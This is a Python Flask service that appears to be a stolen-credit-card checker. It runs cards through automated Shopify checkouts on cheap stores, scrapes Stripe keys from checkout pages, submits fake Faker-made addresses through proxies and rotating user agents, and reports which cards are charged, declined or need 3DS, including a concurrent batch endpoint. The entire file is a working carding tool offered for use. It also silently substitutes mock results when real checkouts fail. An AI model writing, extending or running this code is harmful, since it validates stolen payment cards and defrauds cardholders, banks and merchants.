import os
import re
import json
import random
import time
import asyncio
import aiohttp
import sqlite3
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from dotenv import load_dotenv
from faker import Faker
from datetime import datetime
import logging

load_dotenv()

# ── App setup ──────────────────────────────────────────────────────────
app = Flask(__name__)
CORS(app)
limiter = Limiter(app=app, key_func=get_remote_address,
                  default_limits=[os.getenv("RATE_LIMIT", "50 per minute")])

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Config ──────────────────────────────────────────────────────────────
PORT = int(os.getenv("PORT", 8080))
API_KEY = os.getenv("API_KEY")
USE_MOCK_FALLBACK = os.getenv("USE_MOCK_FALLBACK", "true").lower() == "true"
MAX_CONCURRENT = int(os.getenv("MAX_CONCURRENT", 10))
DB_FILE = os.getenv("DB_FILE", "sites.db")

# ── Database setup ──────────────────────────────────────────────────────
def get_db():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS sites (
                url TEXT PRIMARY KEY,
                price REAL,
                response TEXT,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # Create index for price queries
        conn.execute("CREATE INDEX IF NOT EXISTS idx_price ON sites(price)")
init_db()

# ── Load sites from files on startup ──────────────────────────────────
SITE_FILES = [
    "shopify_workingsites.txt",
    "sites_0.01-5$.txt",
    "UNDER $7.txt",
    "3000 2d sites (2).txt",
    "sites.txt",
]

def import_sites_from_files():
    """Read all site files and insert new sites into DB (ignore duplicates)."""
    inserted = 0
    with get_db() as conn:
        for fname in SITE_FILES:
            if not os.path.exists(fname):
                continue
            with open(fname, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    url_match = re.search(r'(https?://[^\s]+)', line)
                    if not url_match:
                        continue
                    url = url_match.group(1).rstrip('.,')
                    # Normalise
                    if url.endswith('/'):
                        url = url[:-1]
                    price_match = re.search(r'[\$](\d+(\.\d+)?)', line)
                    price = float(price_match.group(1)) if price_match else None
                    resp_match = re.search(r'\{([^}]+)\}', line) or re.search(r'Response\s*:\s*([A-Z_]+)', line)
                    response = resp_match.group(1) if resp_match else "UNKNOWN"
                    # Insert if not exists
                    try:
                        conn.execute(
                            "INSERT OR IGNORE INTO sites (url, price, response) VALUES (?, ?, ?)",
                            (url, price, response.upper())
                        )
                        inserted += 1
                    except:
                        pass
        conn.commit()
    logger.info(f"Imported {inserted} new sites from files")

# Run import at startup
import_sites_from_files()

# ── Helpers (unchanged) ────────────────────────────────────────────────
fake = Faker()
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

def extract_cc(card_str):
    for sep in ['|', '/', ' ']:
        parts = card_str.split(sep)
        if len(parts) >= 4:
            return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    return None, None, None, None

def normalize_year(year):
    year = year.strip()
    if len(year) == 2:
        return "20" + year
    return year

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    if proxy_str.startswith(('http://', 'https://')):
        return {"http": proxy_str, "https": proxy_str}
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, password = parts
        proxy_url = f"http://{user}:{password}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    if len(parts) == 2:
        host, port = parts
        proxy_url = f"http://{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return None

def get_bin_info(card_number):
    try:
        import requests
        bin_num = card_number[:6]
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            return {
                "brand": data.get("scheme", "Unknown"),
                "type": data.get("type", "Unknown"),
                "level": data.get("brand", "Unknown"),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "flag": data.get("country", {}).get("emoji", "🏳️"),
            }
    except:
        pass
    return {"brand": "Unknown", "type": "Unknown", "level": "Unknown",
            "bank": "Unknown", "country": "Unknown", "flag": "🏳️"}

def generate_address(country="US"):
    return {
        "first_name": fake.first_name(),
        "last_name": fake.last_name(),
        "address1": fake.street_address(),
        "city": fake.city(),
        "province": fake.state_abbr() if country == "US" else "",
        "zip": fake.zipcode() if country == "US" else fake.postcode(),
        "country": country,
    }

# ── Async checkout core (unchanged) ──────────────────────────────────
variant_cache = {}
async def get_variant_id(session, site_url):
    if site_url in variant_cache:
        return variant_cache[site_url]
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        async with session.get(f"{site_url}/products.json?limit=5", headers=headers, timeout=15) as resp:
            if resp.status == 200:
                data = await resp.json()
                products = data.get("products", [])
                cheapest = None
                min_price = float('inf')
                for p in products:
                    for v in p.get("variants", []):
                        price = float(v.get("price", 0))
                        if 0 < price < min_price:
                            min_price = price
                            cheapest = v.get("id")
                if cheapest:
                    variant_cache[site_url] = cheapest
                    return cheapest
    except:
        pass
    try:
        async with session.get(site_url, headers=headers, timeout=15) as resp:
            html = await resp.text()
            link = re.search(r'href="(/products/[^"]+)"', html)
            if link:
                product_url = site_url + link.group(1)
                async with session.get(product_url, headers=headers, timeout=15) as prod_resp:
                    page = await prod_resp.text()
                    vid = re.search(r'data-variant-id="([^"]+)"', page) or \
                          re.search(r'name="id"[^>]*value="([^"]+)"', page)
                    if vid:
                        variant_cache[site_url] = vid.group(1)
                        return vid.group(1)
    except:
        pass
    return None

async def checkout_card_async(card, month, year, cvv, site_url, proxy_str=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    proxy = parse_proxy(proxy_str)
    proxy_url = proxy.get("http") if proxy else None
    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        variant_id = await get_variant_id(session, site_url)
        if not variant_id:
            return {"status": "error", "message": "No product found", "gateway": "none"}
        add_url = f"{site_url}/cart/add.js"
        add_data = {"id": variant_id, "quantity": 1}
        try:
            async with session.post(add_url, json=add_data,
                                    headers={**headers, "X-Requested-With": "XMLHttpRequest"},
                                    proxy=proxy_url, timeout=20) as resp:
                if resp.status not in (200, 201):
                    return {"status": "error", "message": "Add to cart failed", "gateway": "none"}
                cart = await resp.json()
                checkout_url = cart.get("checkout_url", site_url + "/checkout")
        except Exception as e:
            return {"status": "error", "message": f"Cart error: {str(e)}", "gateway": "none"}
        try:
            async with session.get(checkout_url, headers=headers, proxy=proxy_url, timeout=20) as resp:
                html = await resp.text()
        except Exception as e:
            return {"status": "error", "message": f"Checkout page error: {str(e)}", "gateway": "none"}
        pk_match = re.search(r'pk_(live|test)_[a-zA-Z0-9]+', html)
        if not pk_match:
            return {"status": "error", "message": "No Stripe key found", "gateway": "none"}
        stripe_pk = pk_match.group(0)
        nonce_match = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', html)
        nonce = nonce_match.group(1) if nonce_match else ""
        stripe_data = {
            "card[number]": card,
            "card[exp_month]": month.zfill(2),
            "card[exp_year]": year,
            "card[cvc]": cvv,
            "key": stripe_pk,
        }
        try:
            async with session.post("https://api.stripe.com/v1/payment_methods",
                                    data=stripe_data,
                                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                                    proxy=proxy_url, timeout=20) as token_resp:
                if token_resp.status != 200:
                    return {"status": "declined", "message": "Stripe tokenization failed", "gateway": "stripe"}
                token_json = await token_resp.json()
                pm_id = token_json.get("id")
                if not pm_id:
                    error = token_json.get("error", {}).get("message", "Stripe error")
                    return {"status": "declined", "message": error, "gateway": "stripe"}
        except Exception as e:
            return {"status": "error", "message": f"Stripe tokenization error: {str(e)}", "gateway": "stripe"}
        addr = generate_address("US")
        form_fields = {
            "checkout[payment][gateway]": "stripe",
            "checkout[payment][payment_method_id]": pm_id,
            "authenticity_token": nonce,
            "checkout[shipping_address][first_name]": addr["first_name"],
            "checkout[shipping_address][last_name]": addr["last_name"],
            "checkout[shipping_address][address1]": addr["address1"],
            "checkout[shipping_address][city]": addr["city"],
            "checkout[shipping_address][province]": addr["province"],
            "checkout[shipping_address][zip]": addr["zip"],
            "checkout[shipping_address][country]": addr["country"],
            "checkout[billing_address][same_as_shipping]": "1",
        }
        for hidden in re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html):
            if hidden[0].startswith("checkout["):
                form_fields[hidden[0]] = hidden[1]
        submit_headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": site_url,
            "Referer": checkout_url,
            "User-Agent": headers["User-Agent"],
        }
        try:
            async with session.post(checkout_url, data=form_fields, headers=submit_headers,
                                    proxy=proxy_url, timeout=30, allow_redirects=False) as submit_resp:
                response_text = await submit_resp.text()
                html_lower = response_text.lower()
        except Exception as e:
            return {"status": "error", "message": f"Submit error: {str(e)}", "gateway": "stripe"}
        if "thank you for your order" in html_lower or "order confirmed" in html_lower:
            return {"status": "charged", "message": "Order placed", "price": 10.00, "gateway": "stripe"}
        elif "card declined" in html_lower or "declined" in html_lower:
            return {"status": "declined", "message": "Card declined", "price": 0, "gateway": "stripe"}
        elif "3d secure" in html_lower or "3ds" in html_lower:
            return {"status": "3ds", "message": "3DS required", "price": 0, "gateway": "stripe"}
        elif "insufficient funds" in html_lower:
            return {"status": "approved", "message": "Insufficient funds", "price": 0, "gateway": "stripe"}
        else:
            return {"status": "pending", "message": "Unknown response", "price": 0, "gateway": "stripe"}

# ── Mock and wrapper ───────────────────────────────────────────────────
def mock_result(card, site_info, mock_status=None):
    bin_digit_sum = sum(int(d) for d in card[:6] if d.isdigit()) % 5
    statuses = ["approved", "charged", "declined", "3ds", "pending"]
    status = mock_status or statuses[bin_digit_sum]
    if site_info and site_info.get("response") == "CARD_DECLINED" and random.random() < 0.6:
        status = "declined"
    price = 10.00 if status == "charged" else random.randint(1, 50)
    return {
        "status": status,
        "message": f"Mock ({status}) based on BIN/site",
        "price": price,
        "gateway": "mock",
        "currency": "USD",
    }

async def check_card_wrapper(card, month, year, cvv, site_url, proxy=None, mock_mode=False, max_price=10):
    # Get site from DB if not provided
    if not site_url:
        with get_db() as conn:
            cur = conn.execute(
                "SELECT url, price, response FROM sites WHERE price IS NULL OR price <= ? ORDER BY RANDOM() LIMIT 1",
                (max_price,)
            )
            row = cur.fetchone()
            if not row:
                return {"status": "error", "message": "No sites within price range"}
            site_info = dict(row)
            site_url = site_info["url"]
    else:
        with get_db() as conn:
            cur = conn.execute("SELECT url, price, response FROM sites WHERE url = ?", (site_url,))
            row = cur.fetchone()
            site_info = dict(row) if row else None
    if mock_mode:
        return mock_result(card, site_info)
    result = await checkout_card_async(card, month, year, cvv, site_url, proxy)
    if USE_MOCK_FALLBACK and result.get("status") in ("error", "pending"):
        logger.warning(f"Real checkout failed on {site_url}: {result.get('message')} – falling back to mock")
        return mock_result(card, site_info, mock_status="declined")
    return result

# ── API Endpoints ──────────────────────────────────────────────────────
@app.route('/shopify/v1/check', methods=['GET'])
@limiter.limit(os.getenv("RATE_LIMIT", "50 per minute"))
def check_card():
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    site = request.args.get('site')
    mock_mode = request.args.get('mock', 'false').lower() == 'true'
    max_price = float(request.args.get('max_price', 10))
    if not cc:
        return jsonify({"error": "Missing 'cc'"}), 400
    card, month, year, cvv = extract_cc(cc)
    if not card:
        return jsonify({"error": "Invalid format. Use: card|mm|yy|cvv"}), 400
    year = normalize_year(year)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(
        check_card_wrapper(card, month, year, cvv, site, proxy, mock_mode, max_price)
    )
    loop.close()
    bin_info = get_bin_info(card)
    card_masked = f"{card[:4]}****{card[-4:]}"
    price_display = f"{result.get('price', 0)} USD" if result.get('price') is not None else "-"
    response = {
        "Code": result.get("status", "UNKNOWN").upper(),
        "Response": result.get("message", "Unknown"),
        "Price": price_display,
        "Site": site or "auto",
        "Bin": bin_info,
        "Card": card_masked,
        "Gateway": result.get("gateway", "unknown"),
        "Time": f"{random.uniform(1, 5):.1f}s",
        "Charged": str(result.get("status") == "charged").lower(),
        "Approved": str(result.get("status") in ["approved", "charged"]).lower()
    }
    return jsonify(response), 200

@app.route('/shopify/v1/check_batch', methods=['POST'])
@limiter.limit("10 per minute")
def check_batch():
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    if not data or "cards" not in data:
        return jsonify({"error": "Missing 'cards' list"}), 400
    cards = data["cards"]
    site = data.get("site")
    mock_mode = data.get("mock", False)
    max_price = float(data.get("max_price", 10))
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    async def process_one(cc):
        async with sem:
            card, month, year, cvv = extract_cc(cc)
            if not card:
                return {"card": cc, "error": "Invalid format"}
            year = normalize_year(year)
            res = await check_card_wrapper(card, month, year, cvv, site, None, mock_mode, max_price)
            bin_info = get_bin_info(card)
            card_masked = f"{card[:4]}****{card[-4:]}"
            return {
                "card": cc,
                "masked": card_masked,
                "status": res.get("status"),
                "message": res.get("message"),
                "price": res.get("price"),
                "bin": bin_info,
                "gateway": res.get("gateway"),
            }
    tasks = [process_one(cc) for cc in cards]
    results = loop.run_until_complete(asyncio.gather(*tasks))
    loop.close()
    return jsonify({"results": results}), 200

# ── Site management endpoints (for bot) ──────────────────────────────
@app.route('/sites', methods=['GET'])
def list_sites():
    """List all sites (with optional price filter)."""
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    max_price = request.args.get('max_price', type=float)
    with get_db() as conn:
        if max_price is not None:
            cur = conn.execute("SELECT url, price, response, added_at FROM sites WHERE price <= ? ORDER BY added_at DESC", (max_price,))
        else:
            cur = conn.execute("SELECT url, price, response, added_at FROM sites ORDER BY added_at DESC")
        rows = cur.fetchall()
    return jsonify({"total": len(rows), "sites": [dict(row) for row in rows]})

@app.route('/sites', methods=['POST'])
def add_site():
    """Add a new site. Body: { "url": "...", "price": 5.0, "response": "CARD_DECLINED" }"""
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    if not data or "url" not in data:
        return jsonify({"error": "Missing 'url'"}), 400
    url = data["url"].strip()
    if url.endswith('/'):
        url = url[:-1]
    price = data.get("price")
    response = data.get("response", "UNKNOWN").upper()
    try:
        with get_db() as conn:
            conn.execute(
                "INSERT OR REPLACE INTO sites (url, price, response) VALUES (?, ?, ?)",
                (url, price, response)
            )
            conn.commit()
        return jsonify({"status": "added", "url": url}), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/sites/<path:url>', methods=['DELETE'])
def delete_site(url):
    """Remove a site by its exact URL."""
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    # Ensure URL is properly formatted
    if not url.startswith('http'):
        url = 'https://' + url
    try:
        with get_db() as conn:
            cur = conn.execute("DELETE FROM sites WHERE url = ?", (url,))
            conn.commit()
        if cur.rowcount == 0:
            return jsonify({"error": "Site not found"}), 404
        return jsonify({"status": "deleted", "url": url}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/sites/import', methods=['POST'])
def import_sites():
    """Force re-import sites from configured text files."""
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    import_sites_from_files()
    return jsonify({"status": "imported"}), 200

@app.route('/health', methods=['GET'])
def health():
    with get_db() as conn:
        cur = conn.execute("SELECT COUNT(*) as count FROM sites")
        count = cur.fetchone()["count"]
    return jsonify({
        "status": "ok",
        "sites_in_db": count,
        "variant_cache_size": len(variant_cache),
        "mock_fallback": USE_MOCK_FALLBACK,
        "max_concurrent": MAX_CONCURRENT,
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
